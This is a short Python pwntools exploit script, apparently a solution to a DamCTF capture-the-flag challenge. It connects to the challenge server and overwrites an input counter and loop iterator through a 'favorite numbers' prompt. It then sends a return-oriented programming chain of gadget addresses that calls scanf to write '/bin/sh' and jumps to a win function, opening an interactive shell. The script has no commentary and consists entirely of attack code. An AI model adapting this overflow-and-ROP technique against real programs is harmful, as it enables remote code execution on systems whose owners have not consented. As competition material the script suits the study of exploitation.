#!/bin/python3

from pwn import *

numbers_max_overwrite = b'85899345931'
iterator_overwrite = b'42949672971'
poprdi = b'4196659'
ld = b'4196717'
poprsi_popr15 = b'4196657'
binsh_location = b'6295680'
scanf = b'4195936'
win = b'4196199'
binsh = b'29400045130965551'

r = remote('chals.damctf.xyz', 32575)

r.recvuntil(b'How many favorite numbers do you have?\n')
r.sendline(b'10')

for x in range(5):
    r.recvuntil(b': ')
    r.sendline(b'2')

r.recvuntil(b': ')
r.sendline(numbers_max_overwrite)
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(iterator_overwrite)
r.recvuntil(b': ')
r.sendline(poprdi)
r.recvuntil(b': ')
r.sendline(ld)
r.recvuntil(b': ')
r.sendline(poprsi_popr15)
r.recvuntil(b': ')
r.sendline(binsh_location)
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(scanf)
r.recvuntil(b': ')
r.sendline(poprdi)
r.recvuntil(b': ')
r.sendline(binsh_location)
r.recvuntil(b': ')
r.sendline(win)
r.sendline(binsh)

r.interactive()
